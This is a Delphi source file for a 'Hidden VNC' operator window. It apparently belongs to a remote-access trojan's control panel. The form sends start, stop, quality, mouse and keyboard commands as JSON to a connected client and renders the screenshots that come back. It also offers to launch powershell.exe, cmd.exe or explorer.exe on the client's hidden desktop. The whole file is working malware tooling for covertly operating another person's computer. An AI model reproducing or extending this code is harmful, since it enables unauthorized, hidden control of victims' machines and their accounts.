unit UnitHiddenVNC;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls,
  System.JSON, ncLines, Vcl.Imaging.jpeg, System.SyncObjs;

type
  TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterProc = procedure(aLine: TncLine) of object;

  TForm10 = class(TForm)
    Panel1: TPanel;
    StatusBar1: TStatusBar;
    PaintBox1: TPaintBox;
    Button1: TButton;
    Button2: TButton;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox;
    Button3: TButton;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure PaintBox1Paint(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
  private
    FLine: TncLine;
    FClientID: string;
    FSendJSON: TSendJSONProc;
    FUnregister: TUnregisterProc;
    FIsCapturing: Boolean;
    FBitmap: TBitmap;
    FLock: TCriticalSection;
    FLastWidth, FLastHeight: Integer;

    procedure LogToStatus(const Msg: string);
    procedure SendControlCommand(const Action: string; X: Integer = -1; Y: Integer = -1; Button: Integer = -1; KeyCode: Integer = -1);
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
    procedure DetachCallbacks;
    procedure HandleHVNCJSON(JSONObj: TJSONObject);
    procedure QueueFrameBytes(const Bytes: TBytes);
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

constructor TForm10.Create(AOwner: TComponent);
begin
  inherited;
  FLock := TCriticalSection.Create;
  FBitmap := TBitmap.Create;
  FIsCapturing := False;
  FLastWidth := 0;
  FLastHeight := 0;
  KeyPreview := True;

  ComboBox1.Items.Clear;
  ComboBox1.Items.Add('10%');
  ComboBox1.Items.Add('20%');
  ComboBox1.Items.Add('30%');
  ComboBox1.Items.Add('40%');
  ComboBox1.Items.Add('50%');
  ComboBox1.Items.Add('60%');
  ComboBox1.Items.Add('70%');
  ComboBox1.Items.Add('80%');
  ComboBox1.Items.Add('90%');
  ComboBox1.Items.Add('100%');
  ComboBox1.ItemIndex := 4; // 50% default

  ComboBox2.Items.Clear;
  ComboBox2.Items.Add('powershell.exe');
  ComboBox2.Items.Add('cmd.exe');
  ComboBox2.Items.Add('explorer.exe');
  ComboBox2.ItemIndex := 0;
end;

destructor TForm10.Destroy;
begin
  FBitmap.Free;
  FLock.Free;
  inherited;
end;

procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
  ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
begin
  FLine := aLine;
  FClientID := ClientID;
  FSendJSON := ASendJSON;
  FUnregister := AUnregister;
  Caption := 'Hidden VNC - ' + FClientID;
  LogToStatus('Ready');
end;

procedure TForm10.DetachCallbacks;
begin
  FLine := nil;
  FSendJSON := nil;
  FUnregister := nil;
end;

procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if FIsCapturing then
    Button1Click(nil);

  if Assigned(FUnregister) and Assigned(FLine) then
    FUnregister(FLine);
  Action := caFree;
end;

procedure TForm10.LogToStatus(const Msg: string);
begin
  StatusBar1.SimpleText := Msg;
end;

procedure TForm10.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  FIsCapturing := not FIsCapturing;
  JSONObj := TJSONObject.Create;
  try
    if FIsCapturing then
    begin
      JSONObj.AddPair('action', 'hvnc_start');
      var QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
      JSONObj.AddPair('quality', TJSONNumber.Create(StrToIntDef(QualityStr, 50)));
      Button1.Caption := 'Stop Capturing';
      LogToStatus('Starting Hidden VNC...');
    end
    else
    begin
      JSONObj.AddPair('action', 'hvnc_stop');
      Button1.Caption := 'Start Capturing';
      LogToStatus('Stopping Hidden VNC...');
    end;
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.Button2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_run');
    JSONObj.AddPair('path', ComboBox2.Text);
    FSendJSON(FLine, JSONObj);
    LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.ComboBox1Change(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_quality');
    var QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
    JSONObj.AddPair('quality', TJSONNumber.Create(StrToIntDef(QualityStr, 50)));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.HandleHVNCJSON(JSONObj: TJSONObject);
var
  Action: string;
begin
  if not Assigned(JSONObj) then Exit;
  Action := JSONObj.GetValue('action').Value;

  if Action = 'hvnc_status' then
  begin
    if Assigned(JSONObj.Values['message']) then
      LogToStatus(JSONObj.Values['message'].Value);
  end
  else if Action = 'hvnc_error' then
  begin
    if Assigned(JSONObj.Values['message']) then
    begin
      LogToStatus('Error: ' + JSONObj.Values['message'].Value);
      FIsCapturing := False;
      Button1.Caption := 'Start Capturing';
    end;
  end;
end;

procedure TForm10.QueueFrameBytes(const Bytes: TBytes);
var
  MS: TMemoryStream;
  JPG: TJPEGImage;
begin
  MS := TMemoryStream.Create;
  JPG := TJPEGImage.Create;
  try
    MS.WriteBuffer(Bytes[0], Length(Bytes));
    MS.Position := 0;
    try
      JPG.LoadFromStream(MS);
      FLock.Enter;
      try
        FBitmap.Assign(JPG);
        FLastWidth := FBitmap.Width;
        FLastHeight := FBitmap.Height;
      finally
        FLock.Leave;
      end;
      System.Classes.TThread.Queue(procedure begin PaintBox1.Invalidate; end);
    except
      // Handle corrupted frame if necessary
    end;
  finally
    JPG.Free;
    MS.Free;
  end;
end;

procedure TForm10.PaintBox1Paint(Sender: TObject);
begin
  FLock.Enter;
  try
    if not FBitmap.Empty then
      PaintBox1.Canvas.StretchDraw(PaintBox1.ClientRect, FBitmap);
  finally
    FLock.Leave;
  end;
end;

procedure TForm10.SendControlCommand(const Action: string; X, Y, Button, KeyCode: Integer);
var
  JSONObj: TJSONObject;
  ScaledX, ScaledY: Integer;
begin
  if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  if (FLastWidth = 0) or (FLastHeight = 0) then Exit;

  // Scale coordinates from PaintBox to remote desktop resolution
  ScaledX := Round((X / PaintBox1.Width) * FLastWidth);
  ScaledY := Round((Y / PaintBox1.Height) * FLastHeight);

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', Action);
    if X <> -1 then JSONObj.AddPair('x', TJSONNumber.Create(ScaledX));
    if Y <> -1 then JSONObj.AddPair('y', TJSONNumber.Create(ScaledY));
    if Button <> -1 then JSONObj.AddPair('button', TJSONNumber.Create(Button));
    if KeyCode <> -1 then JSONObj.AddPair('keycode', TJSONNumber.Create(KeyCode));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  BtnIdx: Integer;
begin
  BtnIdx := 0; // Left
  if Button = mbRight then BtnIdx := 1;
  if Button = mbMiddle then BtnIdx := 2;
  SendControlCommand('hvnc_mousedown', X, Y, BtnIdx);
end;

procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  SendControlCommand('hvnc_mousemove', X, Y);
end;

procedure TForm10.PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  BtnIdx: Integer;
begin
  BtnIdx := 0; // Left
  if Button = mbRight then BtnIdx := 1;
  if Button = mbMiddle then BtnIdx := 2;
  SendControlCommand('hvnc_mouseup', X, Y, BtnIdx);
end;

procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  SendControlCommand('hvnc_keydown', -1, -1, -1, Key);
end;

procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
begin
  SendControlCommand('hvnc_keyup', -1, -1, -1, Key);
end;

end.
